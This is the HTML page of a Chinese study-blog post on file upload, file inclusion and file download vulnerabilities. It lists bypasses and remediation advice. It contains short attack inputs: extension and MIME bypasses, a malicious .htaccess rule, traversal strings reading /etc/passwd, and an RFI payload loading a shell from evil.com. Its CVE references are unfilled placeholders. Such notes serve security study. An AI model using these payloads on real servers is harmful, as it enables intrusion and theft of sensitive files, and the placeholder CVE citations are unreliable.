@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件操作漏洞 | Tubby Little Hero</title><meta name="author" content="Tubby Little Hero"><meta name="copyright" content="Tubby Little Hero"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="文件操作漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件操作漏洞">
+<meta property="og:url" content="https://tubby-little-hero.github.io/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Tubby Little Hero">
+<meta property="og:description" content="文件操作漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tubby-little-hero.github.io/img/lingboli.png">
+<meta property="article:published_time" content="2025-07-21T08:18:55.000Z">
+<meta property="article:modified_time" content="2026-03-18T03:16:08.352Z">
+<meta property="article:author" content="Tubby Little Hero">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="web渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tubby-little-hero.github.io/img/lingboli.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "文件操作漏洞",
+  "url": "https://tubby-little-hero.github.io/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/",
+  "image": "https://tubby-little-hero.github.io/img/lingboli.png",
+  "datePublished": "2025-07-21T08:18:55.000Z",
+  "dateModified": "2026-03-18T03:16:08.352Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Tubby Little Hero",
+      "url": "https://tubby-little-hero.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tubby-little-hero.github.io/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件操作漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/leisai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/mao.png" alt="Logo"><span class="site-name">Tubby Little Hero</span></a><a class="nav-page-title" href="/"><span class="site-name">文件操作漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">文件操作漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-21T08:18:55.000Z" title="发表于 2025-07-21 16:18:55">2025-07-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-18T03:16:08.352Z" title="更新于 2026-03-18 11:16:08">2026-03-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%B8%97%E9%80%8F-%E7%BD%91%E5%AE%89/">web渗透 网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="文件操作漏洞（File-Operation-Vulnerabilities）"><a href="#文件操作漏洞（File-Operation-Vulnerabilities）" class="headerlink" title="文件操作漏洞（File Operation Vulnerabilities）"></a>文件操作漏洞（File Operation Vulnerabilities）</h1><p><strong>中心主题</strong>：文件操作漏洞</p>
+<hr>
+<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>服务器和客户端对上传文件的验证不全面</li>
+<li>允许用户直接上传恶意文件（如 webshell），或通过连接&#x2F;包含等方式执行</li>
+</ul>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>直接获取 webshell → 服务器权限</li>
+<li>读取敏感文件（配置文件、源码、数据库凭证）</li>
+<li>远程代码执行（RCE）</li>
+<li>数据泄露、后门植入、横向移动</li>
+</ul>
+<hr>
+<h2 id="2-文件上传漏洞（最常见类型）"><a href="#2-文件上传漏洞（最常见类型）" class="headerlink" title="2. 文件上传漏洞（最常见类型）"></a>2. 文件上传漏洞（最常见类型）</h2><h3 id="2-1-客户端验证绕过"><a href="#2-1-客户端验证绕过" class="headerlink" title="2.1 客户端验证绕过"></a>2.1 客户端验证绕过</h3><ul>
+<li>前端 JS 校验扩展名、大小、类型 → 可直接改包绕过</li>
+<li>修改 Content-Type 为 image&#x2F;jpeg 等伪装</li>
+</ul>
+<h3 id="2-2-服务端验证绕过"><a href="#2-2-服务端验证绕过" class="headerlink" title="2.2 服务端验证绕过"></a>2.2 服务端验证绕过</h3><h4 id="常见黑名单绕过"><a href="#常见黑名单绕过" class="headerlink" title="常见黑名单绕过"></a>常见黑名单绕过</h4><ul>
+<li>后缀绕过：<code>.php</code> → <code>.php5</code> <code>.phtml</code> <code>.php.</code> <code>.php;.jpg</code> <code>.php%00.jpg</code></li>
+<li>双后缀：<code>shell.php.jpg</code> <code>shell.php;.jpg</code></li>
+<li>大小写绕过：<code>.pHp</code> <code>.PhP</code></li>
+<li>特殊字符：<code>shell.php.</code> <code>shell.php%20</code> <code>shell.php::$DATA</code>（Windows NTFS 特性）</li>
+</ul>
+<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><ul>
+<li><p><code>%00</code> 截断（早期 PHP &lt; 5.3.4 有效）</p>
+</li>
+<li><p><code>.htaccess</code> 上传恶意解析规则</p>
+<p>AddType application&#x2F;x-httpd-php .jpg</p>
+</li>
+<li><p>Apache 解析顺序漏洞（多后缀时从右往左解析）</p>
+</li>
+</ul>
+<h4 id="MIME-类型绕过"><a href="#MIME-类型绕过" class="headerlink" title="MIME 类型绕过"></a>MIME 类型绕过</h4><ul>
+<li>Content-Type: image&#x2F;jpeg → 实际内容为 PHP 代码</li>
+</ul>
+<h4 id="其他绕过技巧"><a href="#其他绕过技巧" class="headerlink" title="其他绕过技巧"></a>其他绕过技巧</h4><ul>
+<li>Apache + mod_negotiation：<code>shell.php.jpg</code> → Apache 可能解析为 <code>.php</code></li>
+<li>Nginx + PHP-FPM：文件名后缀无关，取决于 fastcgi_param SCRIPT_FILENAME</li>
+<li>Windows 短文件名：<code>progra~1</code>、<code>com1.php</code> 等</li>
+</ul>
+<h3 id="2-3-典型文件上传漏洞案例"><a href="#2-3-典型文件上传漏洞案例" class="headerlink" title="2.3 典型文件上传漏洞案例"></a>2.3 典型文件上传漏洞案例</h3><ul>
+<li>PHP &lt; 5.3.4 的 <code>%00</code> 截断</li>
+<li>Apache 2.4.x + 多后缀解析顺序</li>
+<li>Nginx 配置不当（PATH_INFO 导致任意文件解析）</li>
+<li>CMS 上传插件漏洞（dedecms、wordpress、phpmyadmin 等）</li>
+</ul>
+<hr>
+<h2 id="3-文件包含漏洞（LFI-RFI）"><a href="#3-文件包含漏洞（LFI-RFI）" class="headerlink" title="3. 文件包含漏洞（LFI &#x2F; RFI）"></a>3. 文件包含漏洞（LFI &#x2F; RFI）</h2><h3 id="3-1-本地文件包含（LFI）"><a href="#3-1-本地文件包含（LFI）" class="headerlink" title="3.1 本地文件包含（LFI）"></a>3.1 本地文件包含（LFI）</h3><ul>
+<li>include&#x2F;require&#x2F;include_once&#x2F;require_once</li>
+<li>常见参数：<code>?page=../../etc/passwd</code> <code>?file=../../../../windows/win.ini</code></li>
+<li>配合日志投毒：User-Agent 写入 webshell → 包含 access.log</li>
+</ul>
+<h3 id="3-2-远程文件包含（RFI）"><a href="#3-2-远程文件包含（RFI）" class="headerlink" title="3.2 远程文件包含（RFI）"></a>3.2 远程文件包含（RFI）</h3><ul>
+<li>allow_url_include &#x3D; On（极少开启）</li>
+<li><code>?page=http://evil.com/shell.txt</code></li>
+</ul>
+<h3 id="3-3-常见路径遍历绕过"><a href="#3-3-常见路径遍历绕过" class="headerlink" title="3.3 常见路径遍历绕过"></a>3.3 常见路径遍历绕过</h3><ul>
+<li><code>../</code> <code>....//</code> <code>....\\</code> <code>./../</code> <code>%2e%2e%2f</code></li>
+<li>URL 编码多次：<code>%252e%252e%252f</code></li>
+<li>绝对路径：<code>/var/www/html/shell.php</code></li>
+</ul>
+<hr>
+<h2 id="4-文件下载漏洞"><a href="#4-文件下载漏洞" class="headerlink" title="4. 文件下载漏洞"></a>4. 文件下载漏洞</h2><ul>
+<li>任意文件下载：<code>?file=../../../../etc/passwd</code></li>
+<li>未授权下载源码、配置文件、数据库备份</li>
+<li>路径穿越 + 后缀黑名单绕过</li>
+</ul>
+<hr>
+<h2 id="5-检测与利用思路"><a href="#5-检测与利用思路" class="headerlink" title="5. 检测与利用思路"></a>5. 检测与利用思路</h2><h3 id="5-1-上传成功判断"><a href="#5-1-上传成功判断" class="headerlink" title="5.1 上传成功判断"></a>5.1 上传成功判断</h3><ol>
+<li>改名后缀为图片 → 上传 → 访问是否解析为 PHP</li>
+<li>改 Content-Type → 上传 → 检查响应</li>
+<li>上传 <code>&lt;?php phpinfo(); ?&gt;</code> → 访问看是否执行</li>
+<li>上传 <code>.htaccess</code> + 图片马 → 测试解析</li>
+</ol>
+<h3 id="5-2-后缀爆破列表（常见可解析后缀）"><a href="#5-2-后缀爆破列表（常见可解析后缀）" class="headerlink" title="5.2 后缀爆破列表（常见可解析后缀）"></a>5.2 后缀爆破列表（常见可解析后缀）</h3><ul>
+<li>php php3 php4 php5 phtml phar inc</li>
+<li>jsp jspx asp aspx cer cdx</li>
+<li>cgi pl py</li>
+</ul>
+<h3 id="5-3-上传路径猜测"><a href="#5-3-上传路径猜测" class="headerlink" title="5.3 上传路径猜测"></a>5.3 上传路径猜测</h3><ul>
+<li>&#x2F;upload&#x2F; &#x2F;uploads&#x2F; &#x2F;files&#x2F; &#x2F;images&#x2F; &#x2F;attachment&#x2F;</li>
+<li>&#x2F;upfiles&#x2F; &#x2F;file&#x2F; &#x2F;tmp&#x2F; &#x2F;data&#x2F;</li>
+</ul>
+<hr>
+<h2 id="6-修复建议"><a href="#6-修复建议" class="headerlink" title="6. 修复建议"></a>6. 修复建议</h2><h3 id="服务端修复"><a href="#服务端修复" class="headerlink" title="服务端修复"></a>服务端修复</h3><ol>
+<li><strong>白名单校验</strong>文件扩展名（而非黑名单）</li>
+<li><strong>重命名</strong>上传文件（随机文件名 + 固定后缀）</li>
+<li><strong>禁止执行权限</strong>：上传目录设置 <code>php_flag engine off</code> 或 <code>Options -ExecCGI</code></li>
+<li><strong>MIME 类型二次校验</strong>（使用 getimagesize &#x2F; finfo）</li>
+<li><strong>限制上传大小</strong> &amp; <strong>禁止 .htaccess 上传</strong></li>
+<li><strong>关闭危险函数</strong>：<code>allow_url_include=Off</code> <code>allow_url_fopen</code> 谨慎开启</li>
+</ol>
+<h3 id="配置层面"><a href="#配置层面" class="headerlink" title="配置层面"></a>配置层面</h3><ul>
+<li>Apache：<code>php_admin_flag engine off</code> 在上传目录</li>
+<li>Nginx：<code>location ~* \.(php|php5|phtml)$ &#123; deny all; &#125;</code> 在上传目录</li>
+<li>上传目录与 Web 根目录分离</li>
+</ul>
+<hr>
+<h2 id="7-典型-CVE-案例参考"><a href="#7-典型-CVE-案例参考" class="headerlink" title="7. 典型 CVE &#x2F; 案例参考"></a>7. 典型 CVE &#x2F; 案例参考</h2><ul>
+<li>CVE-2015-XXXX：各种 CMS 上传绕过</li>
+<li>CVE-2018-XXXX：phpMyAdmin 文件上传</li>
+<li>CVE-2019-XXXX：ThinkPHP &#x2F; Laravel 等框架上传</li>
+<li>图片马 + .htaccess 组合拳</li>
+<li>Nginx + PHP-FPM 路径解析漏洞</li>
+</ul>
+<hr>
+<p><strong>一句话总结防御</strong>：<br>“<strong>上传目录绝不解析 PHP + 文件名不可控 + 白名单校验 + MIME 验证</strong>” 是最稳组合。</p>
+<p>如需补充：</p>
+<ul>
+<li>具体 webshell 一句话木马</li>
+<li>图片马制作方法</li>
+<li>常见 CMS 上传点位置</li>
+<li>最新绕过技巧（2024-2025）<br>随时告诉我，我继续扩展！</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://tubby-little-hero.github.io">Tubby Little Hero</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://tubby-little-hero.github.io/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/">https://tubby-little-hero.github.io/2025/07/21/%E6%96%87%E4%BB%B6%E5%9C%A8%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://tubby-little-hero.github.io" target="_blank">Tubby Little Hero</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a><a class="post-meta__tags" href="/tags/web%E6%B8%97%E9%80%8F/">web渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/lingboli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/21/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E7%90%86%E8%AE%BA%EF%BC%89/" title="sql注入（理论）"><img class="cover" src="/img/dao.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">sql注入（理论）</div></div><div class="info-2"><div class="info-item-1">sql注入</div></div></div></a><a class="pagination-related" href="/2025/07/21/%E6%BA%90%E7%A0%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" title="框架漏洞"><img class="cover" src="/img/leisai.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">框架漏洞</div></div><div class="info-2"><div class="info-item-1">源码框架漏洞</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/21/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%20%E5%BC%B1%E5%8F%A3%E4%BB%A4/" title="暴力破解 弱口令"><img class="cover" src="/img/lingboli.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">暴力破解 弱口令</div></div><div class="info-2"><div class="info-item-1">web渗透的暴力破解与弱口令</div></div></div></a><a class="pagination-related" href="/2025/07/21/CSRF%E6%94%BB%E5%87%BB/" title="CSRF攻击"><img class="cover" src="/img/weierlite.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">CSRF攻击</div></div><div class="info-2"><div class="info-item-1">CSRF攻击</div></div></div></a><a class="pagination-related" href="/2025/07/21/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E7%90%86%E8%AE%BA%EF%BC%89/" title="sql注入（理论）"><img class="cover" src="/img/dao.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">sql注入（理论）</div></div><div class="info-2"><div class="info-item-1">sql注入</div></div></div></a><a class="pagination-related" href="/2025/07/21/%E6%BA%90%E7%A0%81%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/" title="框架漏洞"><img class="cover" src="/img/leisai.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">框架漏洞</div></div><div class="info-2"><div class="info-item-1">源码框架漏洞</div></div></div></a><a class="pagination-related" href="/2025/07/21/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="逻辑漏洞"><img class="cover" src="/img/shuai.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">逻辑漏洞</div></div><div class="info-2"><div class="info-item-1">逻辑漏洞</div></div></div></a><a class="pagination-related" href="/2025/07/21/JAVA%E5%85%A5%E9%97%A8/" title="JAVA基础"><img class="cover" src="/img/weierlite.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-21</div><div class="info-item-2">JAVA基础</div></div><div class="info-2"><div class="info-item-1">Java入门</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Tubby Little Hero</div><div class="author-info-description">芜湖</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是我的私人学习笔记（偶尔娱乐）</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%EF%BC%88File-Operation-Vulnerabilities%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">文件操作漏洞（File Operation Vulnerabilities）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1. 概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.2.</span> <span class="toc-text">危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%9C%80%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">2. 文件上传漏洞（最常见类型）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 客户端验证绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 服务端验证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">常见黑名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">白名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME-%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">MIME 类型绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">其他绕过技巧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E5%85%B8%E5%9E%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 典型文件上传漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88LFI-RFI%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">3. 文件包含漏洞（LFI &#x2F; RFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 